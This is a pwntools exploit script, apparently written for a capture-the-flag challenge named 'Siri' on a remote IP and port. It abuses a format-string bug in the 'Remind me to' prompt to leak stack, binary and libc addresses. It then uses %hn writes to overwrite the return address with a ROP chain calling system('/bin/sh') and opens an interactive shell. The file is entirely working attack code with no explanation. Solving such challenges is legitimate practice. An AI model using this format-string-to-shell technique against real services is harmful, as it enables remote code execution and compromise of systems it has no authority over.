from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

#io=process('./Siri')
libc=ELF('./libc.so.6')
ELF('./Siri')
io=remote('123.56.170.202',12124)

io.recvuntil('>>> ')

io.send('Hey Siri!\x00')
#gdb.attach(io)
io.recvuntil('Can I do for you?')
fmt='Remind me to '+"aaaaaaaa"+"%46$p"
io.send(fmt)

io.recvuntil('aaaaaaaa0x')
rbp=int(io.recv(12),16)
ret=rbp-0x118
print("ret:"+hex(ret))


io.recvuntil('>>> ')
io.send('Hey Siri!\x00')
io.recvuntil('Can I do for you?')
fmt='Remind me to '+"aaaaaaaa"+"%p"
io.send(fmt)

io.recvuntil('aaaaaaaa0x')
base=int(io.recv(12),16)-0x2033
print(hex(base))
alarm_got=base+0x03FB8
puts_got=base+0x03F90

io.recvuntil('>>> ')
io.send('Hey Siri!\x00')
io.recvuntil('Can I do for you?')
fmt2='Remind me to '+"bbbbbbbb"+"%15$s"+p64(alarm_got)
io.send(fmt2)

io.recvuntil('bbbbbbbb')
alarm_add=u64(io.recv(6).ljust(8,'\x00'))
libc_base=alarm_add-libc.sym['alarm']
one=libc_base+0x10a45c
sys=libc_base+libc.sym['system']
sh=libc_base+libc.search('/bin/sh').next()
pop_rdi=base+0x0152b



print(hex(sys),hex(sh),hex(pop_rdi))

def write(add,data):
    print(hex(data))
    io.recvuntil('>>> ')
    io.send('Hey Siri!\x00')
    io.recvuntil('Can I do for you?')
    fmt3=('Remind me to '+"bbbbbbbb"+'%'+str(data-27-8)+'c%17$hn').ljust(42,'d')+p64(add)
    io.send(fmt3)


write(ret-8,(rbp&0xffff)+0x60)
write(ret+8,(pop_rdi&0xffff))
write(ret+10,(pop_rdi>>16&0xffff))
write(ret+12,(pop_rdi>>32&0xffff))
write(ret+14,(0x100))
write(ret+15,(0x100))

write(ret+16,(sh&0xffff))
write(ret+18,(sh>>16&0xffff))
write(ret+20,(sh>>32&0xffff))
write(ret+22,(0x100))
write(ret+23,(0x100))

write(ret+24,(sys&0xffff))
write(ret+26,(sys>>16&0xffff))
write(ret+28,(sys>>32&0xffff))
write(ret+30,(0x100))
write(ret+31,(0x100))

io.recvuntil('>>> ')
io.send('Hey Siri!\x00')
io.recvuntil('Can I do for you?')
fmt='Remind me to '+"aaaaaaaa"+"%48$p%49$p%50$p%51$p"
io.send(fmt)

write(ret,(base+0x1016)&0xffff)

io.sendline('icq6ff2e51dc6d3fcddc3b64cb0f135a')

io.interactive()
